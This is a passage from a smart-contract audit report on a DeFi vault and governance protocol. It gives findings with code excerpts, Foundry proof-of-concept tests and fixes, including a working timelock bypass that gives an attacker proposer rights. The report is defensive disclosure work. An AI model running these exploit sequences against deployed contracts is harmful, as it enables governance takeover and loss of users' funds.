        assertEq(bridge.deployedPrincipal(), 1_000e6, "bridge keeps a stale deployed balance equal to the loss");
        assertEq(custodianRegistry.deployedByCustodian(id), 1_000e6, "registry keeps the same stale deployed balance");
    }
}
```

##### forge-test-command

Path: `shell`

```bash
timeout 300s forge test \
  --match-path test/hyperliquid/POC_HLTradingBridge_target_efe58614.t.sol \
  --match-test test_POC_liveBridgeLossWriteDownLeavesPermanentCrossLedgerDrift \
  -vv
```

#### Recommendation

Add explicit bridge entrypoints for the production loss lifecycle:
- `postNAVWithLossNonce(uint256 vaultId, uint256 bookValue, uint256 rawNav, uint256 observedAt, uint256 lossNonce)`
- `finalizeAttestedLoss(uint256 vaultId, uint256 lossNonce, uint256 amount)`
- `normalizeManualCustodianNAV(...)` on `HLTradingBridge` if the manual fallback is intended to remain live

If the protocol truly intends to retire nonce-bound losses, remove the dead workflow from the vault and tests and replace it with an explicit synchronized bridge/registry/vault write-down flow.

#### Assumptions

- [x] Production wiring sets `HLTradingBridge` as the vault custodian.
- [x] The protocol intends the nonce-bound workflow to stay live.
- [x] No hidden off-contract dispatcher can make the bridge call arbitrary vault functions.

#### Predicted Invalid Reasons

- Low NAV is still handled by `burnForLoss()`, so the nonce-bound path is unnecessary in production.

<a id="finding-open-77"></a>
### OPEN-77 — Direct timelock execution lets the timelock grant itself PROPOSER_ROLE

#### Summary

`ForageGovernor` only blocks `grantRole(PROPOSER_ROLE, address(timelock))` on the governor execution path. Because queued proposals can also be executed directly through `TimelockController.executeBatch()`, and `EXECUTOR_ROLE` is open to `address(0)`, any account can trigger the direct path, let the timelock self-grant `PROPOSER_ROLE`, and schedule follow-on timelock operations without another governance vote.

#### Context Files

##### ForageGovernor self-proposer guard

Path: `src/ForageGovernor.sol`
Highlight lines: 1, 2, 3, 4

```solidity
if (checkSelfProposerGrant && selector == _timelockGrantRoleSelector()) {
    (bytes32 role, address account) = abi.decode(payload, (bytes32, address));
    if (role == _timelockProposerRole() && account == executor) revert TimelockSelfProposerGrant();
    return;
}
```

##### Timelock executeBatch

Path: `lib/openzeppelin-contracts-upgradeable/contracts/governance/TimelockControllerUpgradeable.sol`
Highlight lines: 1, 2, 3, 4, 5, 6

```solidity
function executeBatch(...) public payable virtual onlyRoleOrOpenRole(EXECUTOR_ROLE) {
    bytes32 id = hashOperationBatch(targets, values, payloads, predecessor, salt);
    _beforeCall(id, predecessor);
    for (uint256 i = 0; i < targets.length; ++i) {
        _execute(targets[i], values[i], payloads[i]);
    }
    _afterCall(id);
}
```

##### Timelock self-admin initialization

Path: `lib/openzeppelin-contracts-upgradeable/contracts/governance/TimelockControllerUpgradeable.sol`
Highlight lines: 1

```solidity
_grantRole(DEFAULT_ADMIN_ROLE, address(this));
```

##### AccessControl grantRole

Path: `lib/openzeppelin-contracts-upgradeable/contracts/access/AccessControlUpgradeable.sol`
Highlight lines: 1, 2

```solidity
function grantRole(bytes32 role, address account) public virtual onlyRole(getRoleAdmin(role)) {
    _grantRole(role, account);
}
```

#### Proof of Concept

Save the PoC as `test/audit/cantina_scan4/POC_TimelockDirectSelfProposerBypass_9613ae7d.t.sol` and run the focused Foundry test.

The PoC demonstrates:
- `governor.execute(...)` reverts on the self-proposer grant.
- `timelock.executeBatch(...)` on the same queued batch succeeds.
- The timelock self-grants `PROPOSER_ROLE`, schedules a follow-on grant, and later lets the attacker obtain direct proposer rights.

##### POC_TimelockDirectSelfProposerBypass_9613ae7d.t.sol

Path: `test/audit/cantina_scan4/POC_TimelockDirectSelfProposerBypass_9613ae7d.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IGovernor} from "@openzeppelin/contracts/governance/IGovernor.sol";
import {CantinaScan4RealGovernanceTestBase} from "./CantinaScan4RealGovernanceTestBase.sol";

/**
 * @title POC: Direct Timelock Execution Bypasses Self-Proposer Guard
 * @notice Proof Statement: Proves that a queued proposal blocked by `ForageGovernor.execute()` can still be
 * executed directly through `TimelockController.executeBatch()`, letting the timelock grant itself
 * `PROPOSER_ROLE`, queue a follow-on role grant, and ultimately give an attacker direct proposer rights
 * without a second governance vote.
 */
contract POC_TimelockDirectSelfProposerBypass_9613ae7d is CantinaScan4RealGovernanceTestBase {
    bytes4 internal constant TIMELOCK_SELF_PROPOSER_GRANT_SELECTOR = bytes4(keccak256("TimelockSelfProposerGrant()"));

    function test_poc_directTimelockExecutionSelfGrantsAndBootstrapsAttackerProposer() public {
        bytes32 proposerRole = keccak256("PROPOSER_ROLE");
        uint256 productionDelay = PRODUCTION_TIMELOCK_DELAY;
        bytes32 nestedSalt = keccak256("nested_grant_attacker_proposer");
        bytes32 descriptionHash = keccak256(bytes("POC: direct timelock execution bootstraps proposer takeover"));
        uint256 proposalId;
        bytes32 nestedOpId;

        _setTimelockDelayViaGovernance(productionDelay);

        {
            bytes memory grantAttackerProposerData = abi.encodeCall(timelock.grantRole, (proposerRole, attacker));
            nestedOpId =
                timelock.hashOperation(address(timelock), 0, grantAttackerProposerData, bytes32(0), nestedSalt);

            address[] memory targets = new address[](2);
            targets[0] = address(timelock);
            targets[1] = address(timelock);

            uint256[] memory values = new uint256[](2);
            bytes[] memory calldatas = new bytes[](2);
            calldatas[0] = abi.encodeCall(timelock.grantRole, (proposerRole, address(timelock)));
            calldatas[1] = abi.encodeCall(
                timelock.schedule,
                (address(timelock), 0, grantAttackerProposerData, bytes32(0), nestedSalt, productionDelay)
            );

            proposalId = _createProposalWithParams(targets, values, calldatas, "POC: direct timelock execution bootstraps proposer takeover");
            _passProposal(proposalId);

            governor.queue(targets, values, calldatas, descriptionHash);
            vm.warp(block.timestamp + productionDelay + 1);

            vm.expectRevert(abi.encodeWithSelector(TIMELOCK_SELF_PROPOSER_GRANT_SELECTOR));
            governor.execute(targets, values, calldatas, descriptionHash);

            vm.prank(attacker);
            timelock.executeBatch(targets, values, calldatas, bytes32(0), _timelockSalt(descriptionHash));
        }

        assertTrue(timelock.hasRole(proposerRole, address(timelock)));
        assertTrue(timelock.isOperationPending(nestedOpId));
        assertEq(uint256(governor.state(proposalId)), uint256(IGovernor.ProposalState.Executed));

        vm.warp(block.timestamp + productionDelay + 1);
        {
            bytes memory grantAttackerProposerData = abi.encodeCall(timelock.grantRole, (proposerRole, attacker));
            vm.prank(attacker);
            timelock.execute(address(timelock), 0, grantAttackerProposerData, bytes32(0), nestedSalt);
        }

        assertTrue(timelock.hasRole(proposerRole, attacker));

        {
            bytes memory grantAttackerCancellerData =
                abi.encodeCall(timelock.grantRole, (keccak256("CANCELLER_ROLE"), attacker));
            bytes32 attackerSalt = keccak256("attacker_scheduled_role_grant");
            bytes32 attackerOpId =
                timelock.hashOperation(address(timelock), 0, grantAttackerCancellerData, bytes32(0), attackerSalt);

            vm.prank(attacker);
            timelock.schedule(address(timelock), 0, grantAttackerCancellerData, bytes32(0), attackerSalt, productionDelay);

            assertTrue(timelock.isOperationPending(attackerOpId));
        }
    }

    function _setTimelockDelayViaGovernance(uint256 newDelay) internal {
        address[] memory targets = new address[](1);
        targets[0] = address(timelock);

        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeCall(timelock.updateDelay, (newDelay));

        string memory description = "Setup: raise timelock delay";
        bytes32 descriptionHash = keccak256(bytes(description));

        uint256 proposalId = _createProposalWithParams(targets, values, calldatas, description);
        _passProposal(proposalId);

        governor.queue(targets, values, calldatas, descriptionHash);
        vm.warp(block.timestamp + TIMELOCK_MIN_DELAY + 1);
        governor.execute(targets, values, calldatas, descriptionHash);
    }

    function _timelockSalt(bytes32 descriptionHash) internal view returns (bytes32) {
        return bytes20(address(governor)) ^ descriptionHash;
    }
}

```

##### forge test command

Path: ``

```bash
cd openforage_smart_contracts
forge test --match-path test/audit/cantina_scan4/POC_TimelockDirectSelfProposerBypass_9613ae7d.t.sol --match-test test_poc_directTimelockExecutionSelfGrantsAndBootstrapsAttackerProposer -vv
```

#### Recommendation

Primary fix: remove the ability to execute queued governance operations directly on the timelock when protocol invariants are enforced at the governor layer.

The safest fix is to close the open executor path for governor-managed timelocks and force execution through `ForageGovernor.execute()`. If open execution is required, then move the self-proposer rejection into the timelock layer so direct `execute()` / `executeBatch()` calls also enforce it.

Additional defense: add a timelock-level invariant that rejects any self-call to `grantRole(PROPOSER_ROLE, address(this))` when the timelock is governor-managed.

#### Assumptions

- [x] The malicious proposal still needs to pass and be queued once.
- [x] The deployment uses the open-executor topology with `EXECUTOR_ROLE` granted to `address(0)`.
- [x] The bypass does not depend on lowering the timelock delay first.

#### Predicted Invalid Reasons

- "The direct path exists, but the report exaggerates it. Governance can already grant `PROPOSER_ROLE` to another address through a standard timelock operation, so this is not a unique critical takeover; it is a bypass of a narrow guard added for recursive timelock safety."

<a id="finding-open-93"></a>
### OPEN-93 — Queue entries keep priority after emergencyUnlock removes their FORAGE backing

#### Summary

`StakingQueue` grants priority once at join time and never revalidates the live queue-specific FORAGE lock before processing. If the queue is deauthorized as a locker and `ForageToken.emergencyUnlock(account, address(queue))` releases that escrow, the entry stays in `_tierPriorityQueue` and can still be processed ahead of standard entries even though the FORAGE has already become transferable.

#### Context Files

##### StakingQueue.joinQueue priority grant

Path: `src/StakingQueue.sol`
Highlight lines: 1

```solidity
if (forageToLock >= 1e15 && _forage.code.length > 0) {
    (bool lockSuccess,) = _forage.call(abi.encodeWithSelector(_SEL_LOCK, msg.sender, forageToLock));
    if (lockSuccess) {
        isPriority = true;
        _forageLockedPerEntry[queueId] = forageToLock;
    }
}
...
if (isPriority) {
    _priorityRiskusdQueued[msg.sender] += riskusdAmount;
    _tierPriorityQueue[tier].push(queueId);
}
```

##### ForageToken.emergencyUnlock recovery

Path: `src/ForageToken.sol`
Highlight lines: 1

```solidity
function setAuthorizedLocker(address locker_, bool authorized_) external onlyOwner {
    _authorizedLockers[locker_] = authorized_;
}

function emergencyUnlock(address account, address locker) external onlyOwner {
    if (_authorizedLockers[locker]) revert LockerStillAuthorized();
    uint256 lockerBal = _lockerBalances[account][locker];
    if (lockerBal == 0) revert NoLockerBalance();
    _lockedBalances[account] -= lockerBal;
    _lockerBalances[account][locker] = 0;
    _accountLockers[account].remove(locker);
    emit ForageUnlocked(account, lockerBal, locker);
}
```

##### StakingQueue.processQueue priority lane

Path: `src/StakingQueue.sol`
Highlight lines: 1

```solidity
uint256 processed =
    _processLane(_tierPriorityQueue[tier], _tierPriorityHead[tier], tier, maxEntries, avail, tierAvail, true);
...
function _processLane(..., bool isPriorityLane) internal returns (uint256 processedCount) {
    ...
    _depositQueuedRiskusd(tier, entry.riskusdAmount, entry.depositor);
    entry.processed = true;
    if (isPriorityLane) {
        _priorityRiskusdQueued[entry.depositor] -= entry.riskusdAmount;
        uint256 qId = lane[i];
        uint256 forageToUnlock = _forageLockedPerEntry[qId];
        if (forageToUnlock > 0) {
            (bool unlockSuccess,) = _forage.call(abi.encodeWithSelector(_SEL_UNLOCK, entry.depositor, forageToUnlock));
            if (unlockSuccess) {
                _forageLockedPerEntry[qId] = 0;
            } else {
                emit ForageUnlockFailed(entry.depositor, forageToUnlock);
            }
        }
    }
}
```

#### Proof of Concept

A Foundry PoC shows that a user can join `StakingQueue` through the priority lane, have the queue's FORAGE lock removed by `ForageToken.emergencyUnlock(account, address(queue))`, transfer the recovered FORAGE away, and still be processed ahead of a standard-lane competitor because `processQueue()` never revalidates the live queue locker balance.

##### POC_StakingQueueEmergencyUnlock_375d1e69.t.sol

Path: `test/POC_StakingQueueEmergencyUnlock_375d1e69.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import "../src/ForageToken.sol";
import "../src/StakingQueue.sol";
import "./mocks/MockAtRISKUSD.sol";
import "./mocks/MockRISKUSD.sol";
import "./mocks/MockVaultRegistry.sol";

/**
 * @title POC: Priority entry survives emergency unlock with no live FORAGE backing
 * @notice Proof Statement: Proves that a user can join `StakingQueue` with a real `ForageToken`
 * priority lock, have governance deauthorize the queue and release that exact queue lock through
 * `ForageToken.emergencyUnlock`, transfer the returned FORAGE away, and still have the stale
 * priority entry processed ahead of a standard-lane competitor because `processQueue()` never
 * revalidates the queue's live `lockerBalance(account, address(queue))`.
 */
contract POC_StakingQueueEmergencyUnlock_375d1e69 is Test {
    ForageToken internal forage;
    StakingQueue internal queue;
    MockRISKUSD internal riskusd;
    MockAtRISKUSD internal vault0;
    MockAtRISKUSD internal vault1;
    MockAtRISKUSD internal vault2;
    MockAtRISKUSD internal vault3;
    MockVaultRegistry internal registry;

    address internal owner = makeAddr("owner");
    address internal teamVesting = makeAddr("teamVesting");
    address internal forageTreasury = makeAddr("forageTreasury");
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal charlie = makeAddr("charlie");

    uint256 internal vaultId;

    function setUp() public {
        riskusd = new MockRISKUSD();

        ForageToken forageImpl = new ForageToken();
        bytes memory forageInit = abi.encodeCall(ForageToken.initialize, (teamVesting, forageTreasury, owner));
        forage = ForageToken(address(new ERC1967Proxy(address(forageImpl), forageInit)));

        vault0 = new MockAtRISKUSD(address(riskusd));
        vault1 = new MockAtRISKUSD(address(riskusd));
        vault2 = new MockAtRISKUSD(address(riskusd));
        vault3 = new MockAtRISKUSD(address(riskusd));

        registry = new MockVaultRegistry();
        address[4] memory tierVaults = [address(vault0), address(vault1), address(vault2), address(vault3)];
        uint256[4] memory lockups = [uint256(0), 7776000, 15552000, 31104000];
        uint16[4] memory yieldBps = [uint16(5000), 5500, 6000, 6500];
        uint16[4] memory fundingBps = [uint16(2000), 2000, 1500, 1500];
        vaultId = registry.addTestVault(
            "Test Vault", "TV", tierVaults, address(0), 10_000_000e6, lockups, yieldBps, fundingBps
        );

        StakingQueue queueImpl = new StakingQueue();
        bytes memory queueInit = abi.encodeCall(
            StakingQueue.initialize, (address(riskusd), address(forage), tierVaults, address(registry), owner)
        );
        queue = StakingQueue(address(new ERC1967Proxy(address(queueImpl), queueInit)));

        vm.prank(owner);
        queue.setVaultId(vaultId);

        vm.prank(owner);
        forage.setAuthorizedLocker(address(queue), true);

        vm.startPrank(owner);
        queue.setForagePriceUsd(1e6);
        vm.warp(block.timestamp + queue.FINALIZE_DELAY() + 1);
        queue.finalizeForagePriceUsd();
        queue.setPriorityMultiplier(10);
        vm.stopPrank();

        vm.prank(forageTreasury);
        forage.transfer(alice, 100_000e18);
    }

    function test_priorityEntryKeepsLaneAfterEmergencyUnlock() public {
        uint256 queueIdAlice = _join(alice, 1_000_000e6);
        uint256 expectedLock = 100_000e18;

        StakingQueue.QueueEntry memory aliceEntry = queue.getQueueEntry(queueIdAlice);
        assertTrue(aliceEntry.priority, "alice should enter the priority lane");
        assertEq(queue.forageLockedPerEntry(queueIdAlice), expectedLock, "stored queue lock");
        assertEq(forage.lockerBalance(alice, address(queue)), expectedLock, "live queue locker balance before recovery");

        vm.startPrank(owner);
        forage.setAuthorizedLocker(address(queue), false);
        forage.emergencyUnlock(alice, address(queue));
        vm.stopPrank();

        assertEq(forage.lockerBalance(alice, address(queue)), 0, "queue locker balance released");
        assertEq(forage.lockedBalance(alice), 0, "aggregate lock released");

        vm.prank(alice);
        forage.transfer(charlie, expectedLock);
        assertEq(forage.balanceOf(charlie), expectedLock, "recovered FORAGE became transferable");
        assertEq(forage.balanceOf(alice), 0, "alice moved the recovered FORAGE away");

        uint256 queueIdBob = _join(bob, 1_000_000e6);
        StakingQueue.QueueEntry memory bobEntry = queue.getQueueEntry(queueIdBob);
        assertFalse(bobEntry.priority, "new entry after deauthorization should fall back to standard lane");

        registry.setTestCapacityCap(vaultId, 1_000_000e6);

        vm.prank(charlie);
        queue.processQueue(0, 2);

        assertTrue(queue.getQueueEntry(queueIdAlice).processed, "stale priority entry still processed");
        assertFalse(queue.getQueueEntry(queueIdBob).processed, "standard competitor stays queued");

        (uint256 processedAmount, address processedDepositor) = vault0.depositCalls(0);
        assertEq(processedDepositor, alice, "priority lane still wins processing order");
        assertEq(processedAmount, 1_000_000e6, "processed amount");

        assertEq(forage.lockerBalance(alice, address(queue)), 0, "no live queue lock existed at processing time");
        assertEq(queue.forageLockedPerEntry(queueIdAlice), expectedLock, "stale per-entry lock remains after failed unlock");
    }

    function _join(address user, uint256 amount) internal returns (uint256 queueId) {
        riskusd.mint(user, amount);
        vm.prank(user);
        riskusd.approve(address(queue), amount);

        queueId = queue.nextQueueId();
        vm.prank(user);
        queue.joinQueue(amount, 0);
    }
}

```

##### forge test command

Path: `shell`

```bash
forge test --match-path test/POC_StakingQueueEmergencyUnlock_375d1e69.t.sol -vv
```

#### Recommendation

Before processing or preserving a priority entry, revalidate `lockerBalance(entry.depositor, address(this))` against the amount required for that entry. If the live locker balance is below the stored `_forageLockedPerEntry[queueId]`, demote the entry to the standard lane or revert until the user restores backing.

A minimal defense is to check the live queue locker balance before processing priority entries:

```solidity
(bool ok, uint256 liveBalance) = _queueLockerBalance(entry.depositor);
if (!ok || liveBalance < _forageLockedPerEntry[qId]) {
    // demote or refuse priority processing
}
```

#### Assumptions

- [x] Governance deauthorizes `StakingQueue` as a locker and uses `emergencyUnlock()` to recover stranded queue-backed FORAGE.
- [x] At least one priority entry still exists when the queue lock is released.
- [x] The affected entry has not already been processed or cancelled before the emergency unlock.

#### Predicted Invalid Reasons

- This is an owner-only recovery edge case, not a user-triggerable exploit.
- At worst this gives one user queue preference for a batch, not fund theft or vote inflation.

<a id="finding-open-78"></a>
### OPEN-78 — Real bridge losses are globally unbound, so one vault shortfall freezes every vault and burns can be booked against any vaultId

#### Summary

Live bridge reporting always posts `lossNonce = 0`, so a bridge-reported shortfall never binds to a vault. That leaves `lossPendingVaultId()` at `0`, makes `VaultRegistry.startWindDown()` fail-close every vault, and allows `burnForLoss(vaultId, ...)` to accept any vault id on the live path.

#### Context Files

##### HLTradingBridge.sol

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1

```solidity
IRISKUSDVaultNAVPort(riskusdVault).recordCustodianNAV(vaultId, applied, 0);
```

##### RISKUSDVault.sol

Path: `openforage_audit_repo/openforage_smart_contracts/src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
function _recordCustodianNAV(uint256 vaultId, uint256 nav, uint256 lossNonce) internal {
    if (lossNonce != 0) {
        _requireActiveVault(vaultId);
        uint256 pendingVaultId = _pendingLossVaultIdForBinding();
        if (pendingVaultId != 0 && vaultId != pendingVaultId) revert VaultIdMismatch();
    }
    ...
    if (lossNonce != 0) {
        _latestLossNonce = lossNonce;
        if (nav < _totalDeployed) {
            _latestLossVaultId = vaultId;
            _latestLossAmount = _totalDeployed - nav;
        }
    }
}
```

##### RISKUSDVault.sol

Path: `openforage_audit_repo/openforage_smart_contracts/src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
function lossPendingVaultId() external view returns (uint256) {
    if (_hasUnresolvedAttestedLoss()) return _latestLossVaultId;
    return _lossPendingVaultId;
}
```

##### RISKUSDVault.sol

Path: `openforage_audit_repo/openforage_smart_contracts/src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
function _pendingLossVaultIdForBinding() internal view returns (uint256) {
    if (_hasOpenAttestedLossNonce()) return _latestLossVaultId;
    return _lossPendingVaultId;
}
```

##### VaultRegistry.sol

Path: `openforage_audit_repo/openforage_smart_contracts/src/VaultRegistry.sol`
Highlight lines: 1

```solidity
if (riskVault.lossPending()) {
    uint256 pendingVaultId = riskVault.lossPendingVaultId();
    if (pendingVaultId == vaultId || pendingVaultId == 0) revert LossPendingForVault();
}
```

#### Proof of Concept

1. Post a bridge-style shortfall with `recordCustodianNAV(1, 400e6, 0)`.
2. Confirm `lossPending() == true` while `lossPendingVaultId() == 0`.
3. `registry.startWindDown(2)` reverts for an unrelated vault.
4. `burnForLoss(2, 100e6)` succeeds on the same shortfall.

##### ValidationLossBindingScratch.t.sol

Path: `test/ValidationLossBindingScratch.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "./helpers/RISKUSDVaultTestBase.sol";
import "../src/VaultRegistry.sol";

contract ValidationLossBindingScratch is RISKUSDVaultTestBase {
    VaultRegistry internal registry;

    function setUp() public override {
        super.setUp();
        _setupCustodian();
        _setupLossReporter();

        vm.startPrank(owner);
        vault.setPerBlockMintCap(10_000, type(uint256).max);
        vault.setDailyMintCapBps(10_000);
        vault.setWeeklyMintCapBps(10_000);
        vault.setMaxDeploymentRatioBps(10_000);
        vm.stopPrank();

        VaultRegistry implementation = new VaultRegistry();
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), abi.encodeCall(VaultRegistry.initialize, (owner)));
        registry = VaultRegistry(address(proxy));

        vm.prank(owner);
        registry.initializeV2(address(vault));

        vm.prank(owner);
        vault.initializeV2(address(registry));

        _addVault("V1", 1000);
        _addVault("V2", 2000);
    }

    function test_bridgeStyleZeroNonceLossIsUnboundAndGlobal() public {
        _deposit(alice, 500e6);

        vm.prank(alice);
        riskusd.transfer(lossReporterAddr, 100e6);

        vm.prank(custodianAddr);
        vault.deployCapital(500e6);

        vm.prank(custodianAddr);
        vault.recordCustodianNAV(1, 400e6, 0);

        assertTrue(vault.lossPending(), "shortfall should put the vault into loss-pending state");
        assertEq(vault.lossPendingVaultId(), 0, "zero-nonce shortfall is exposed as unbound");

        vm.startPrank(owner);
        vm.expectRevert(VaultRegistry.LossPendingForVault.selector);
        registry.startWindDown(1);
        vm.expectRevert(VaultRegistry.LossPendingForVault.selector);
        registry.startWindDown(2);
        vm.stopPrank();

        vm.prank(lossReporterAddr);
        vault.burnForLoss(2, 100e6);

        assertFalse(vault.lossPending(), "burning down the shortfall clears the global lock");
        assertEq(vault.totalDeployed(), 400e6, "deployed capital drops by the burned shortfall");
    }

    function _addVault(string memory abbreviation, uint160 seed) internal returns (uint256 vaultId) {
        address[4] memory tierVaults = [
            address(uint160(seed + 1)),
            address(uint160(seed + 2)),
            address(uint160(seed + 3)),
            address(uint160(seed + 4))
        ];
        uint256[4] memory lockups;
        uint16[4] memory yieldSplits = [uint16(10_000), uint16(10_000), uint16(10_000), uint16(10_000)];
        uint16[4] memory fundingBps;

        vm.prank(owner);
        vaultId = registry.addVault(
            abbreviation,
            abbreviation,
            tierVaults,
            address(uint160(seed + 100)),
            1,
            lockups,
            yieldSplits,
            fundingBps
        );
    }
}
```

#### Recommendation

Ensure the live bridge path preserves vault binding.

Primary fix:

```solidity
// Make the bridge submit nonce-bound loss attestations for real shortfalls.
// RISKUSDVault should only expose vaultId-bound settlement semantics that the bridge can actually satisfy.
```

Alternative fix:
- If losses are intentionally global, remove `vaultId` from the public loss APIs and stop using `lossPendingVaultId()` to drive per-vault registry behavior.

#### Assumptions

- [x] The deployment uses `HLTradingBridge` as the live custodian path for NAV reporting.
- [x] Operators rely on `vaultId` to isolate incidents and lifecycle actions per vault.
- [x] The loss reporter is expected to preserve that vault binding during settlement rather than treating every bridge loss as globally unbound.

#### Predicted Invalid Reasons

- "This is intentional fail-closed behavior. `_totalDeployed` is global, so a shortfall is economically global and `vaultId` is informational only."

<a id="finding-open-85"></a>
### OPEN-85 — Live zero-nonce loss burns never notify VaultRegistry, so the real bridge path skips the same-block loss-resolution cooldown

#### Summary

`HLTradingBridge.postNAV()` always uses `lossNonce == 0`, so a bridge shortfall can be absorbed by `burnForLoss()` without calling `VaultRegistry.notifyLossResolved()`. That skips the registry's same-block `startWindDown()` cooldown on the live path, but only for a privileged lifecycle transition.

#### Context Files

##### HLTradingBridge.postNAV()

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1

```solidity
IRISKUSDVaultNAVPort(riskusdVault).recordCustodianNAV(vaultId, applied, 0);
```

##### _lossPendingActive()

Path: `openforage_audit_repo/openforage_smart_contracts/src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
function _lossPendingActive() internal view returns (bool) {
    return
        _lossPending || _hasUnresolvedAttestedLoss() || _custodianNAVUnavailableOrStale()
            || _hasCurrentNAVShortfall();
}
```

##### _burnForLoss() notification branch

Path: `openforage_audit_repo/openforage_smart_contracts/src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
if (_totalAcknowledgedLoss == 0 && _lossPending) {
    _clearLossPendingAndNotifyRegistry();
}
```

##### _clearLossPendingAndNotifyRegistry()

Path: `openforage_audit_repo/openforage_smart_contracts/src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
function _clearLossPendingAndNotifyRegistry() internal {
    _lastLossResolutionBlock = block.number;
    if (address(_vaultRegistry) != address(0)) {
        _vaultRegistry.notifyLossResolved();
    }
}
```

##### VaultRegistry.startWindDown() cooldown

Path: `openforage_audit_repo/openforage_smart_contracts/src/VaultRegistry.sol`
Highlight lines: 1

```solidity
if (_lastLossResolutionBlock > 0 && block.number <= _lastLossResolutionBlock + LOSS_COOLDOWN_BLOCKS - 1) {
    revert LossCooldownActive();
}
```

#### Proof of Concept

A focused Forge repro wires a real `VaultRegistry` to a real `RISKUSDVault`, posts a zero-nonce shortfall with `recordCustodianNAV(1, 900e6, 0)`, burns the gap with `burnForLoss(1, 100e6)`, and then calls `startWindDown(1)` in the same block. The call succeeds because the registry never receives `notifyLossResolved()` on that path.

##### same-block wind-down repro

Path: `openforage_audit_repo/openforage_smart_contracts/test/validation/Validation470b97c0.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import "./helpers/RISKUSDVaultTestBase.sol";
import "../src/VaultRegistry.sol";

contract Validation_470b97c0 is RISKUSDVaultTestBase {
    VaultRegistry internal registry;

    function setUp() public override {
        super.setUp();

        VaultRegistry registryImplementation = new VaultRegistry();
        bytes memory registryInit = abi.encodeCall(VaultRegistry.initialize, (owner));
        registry = VaultRegistry(address(new ERC1967Proxy(address(registryImplementation), registryInit)));

        vm.prank(owner);
        registry.initializeV2(address(vault));

        vm.prank(owner);
        vault.initializeV2(address(registry));

        address[4] memory tierVaults = [
            makeAddr("tier0"), makeAddr("tier1"), makeAddr("tier2"), makeAddr("tier3")
        ];
        uint16[4] memory yieldSplits = [uint16(2500), uint16(2500), uint16(2500), uint16(2500)];
        uint16[4] memory fundingBps;
        uint256[4] memory lockups = [uint256(0), uint256(30 days), uint256(90 days), uint256(180 days)];

        vm.prank(owner);
        registry.addVault("Validation Vault", "VAL", tierVaults, makeAddr("stakingQueue"), 1_000_000e6, lockups, yieldSplits, fundingBps);

        _setupCustodian();
        _setupLossReporter();

        vm.prank(owner);
        vault.setMaxDeploymentRatioBps(10_000);
    }

    function test_zeroNonceBurnClearsLossPendingWithoutStartingRegistryCooldown() public {
        _deposit(alice, 1_000e6);

        vm.prank(custodianAddr);
        vault.deployCapital(1_000e6);

        vm.prank(custodianAddr);
        vault.recordCustodianNAV(1, 900e6, 0);

        assertTrue(vault.lossPending(), "zero-nonce shortfall should gate vault");
        assertEq(vault.lossPendingVaultId(), 0, "zero-nonce shortfall stays unbound");

        vm.prank(owner);
        vm.expectRevert(VaultRegistry.LossPendingForVault.selector);
        registry.startWindDown(1);

        vm.prank(alice);
        riskusd.transfer(lossReporterAddr, 100e6);

        vm.prank(lossReporterAddr);
        vault.burnForLoss(1, 100e6);

        assertFalse(vault.lossPending(), "burn removes live NAV shortfall");

        vm.prank(owner);
        registry.startWindDown(1);

        VaultConfig memory config = registry.getVault(1);
        assertEq(uint8(config.status), uint8(VaultStatus.WindingDown), "wind-down should succeed in same block");
    }
}
```

#### Recommendation

Call `_clearLossPendingAndNotifyRegistry()` whenever a zero-nonce shortfall is fully absorbed, not only when legacy `_lossPending` state was present.

Primary fix:

```solidity
// After burnForLoss changes _totalDeployed, re-check whether a live shortfall was resolved.
if (!_lossPendingActive() && hadLossBeforeBurn) {
    _clearLossPendingAndNotifyRegistry();
}
```

Alternative fix:
- Move the registry notification into a shared post-resolution helper that is used by both legacy and zero-nonce loss paths.

#### Assumptions

- [x] The deployed bridge loss path uses `HLTradingBridge.postNAV(..., 0)` rather than an alternate zero-nonce hook.
- [x] The intended one-block cooldown is meant to cover real bridge loss resolution, not only legacy `_lossPending` resolution.
- [x] Operators can call `startWindDown()` in the same block that a loss reporter clears the shortfall.

#### Predicted Invalid Reasons

- Only the owner can call `startWindDown()`, so missing the cooldown is harmless.
- This is a real code-path mismatch, but it is not a contest-severity security issue.
- Only trusted roles can produce the sequence.
- The only demonstrated effect is skipping a one-block administrative cooldown before `startWindDown()`.

<a id="informational"></a>
## Informational

<a id="finding-open-70"></a>
### OPEN-70 — Tier loss socialization is not atomically coupled to RISKUSDVault settlement

#### Summary

`atRISKUSD` share pricing is updated only through local `_legitimateAssets`, while `RISKUSDVault` can clear `lossPending()` without any production call that also reprices tiers. That leaves no onchain proof that a resolved upstream loss was applied to tier accounting before exits reopen.

#### Context Files

##### atRISKUSD pricing mutators

Path: `src/atRISKUSD.sol`
Highlight lines: 1

```solidity
function accrueYield(uint256 riskusdAmount) external whenNotPaused nonReentrant {
    if (msg.sender != _yieldSource) revert UnauthorizedYieldSource();
    ...
    _legitimateAssets += riskusdAmount;
}

function absorbLoss(uint256 riskusdAmount) external nonReentrant {
    if (msg.sender != _yieldSource) revert UnauthorizedYieldSource();
    ...
    _decreaseLegitimateAssets(riskusdAmount);
}
```

##### atRISKUSD totalAssets

Path: `src/atRISKUSD.sol`
Highlight lines: 1

```solidity
function totalAssets() public view override returns (uint256) {
    return _legitimateAssets;
}
```

##### RISKUSDVault loss gate clear

Path: `src/RISKUSDVault.sol`
Highlight lines: 1

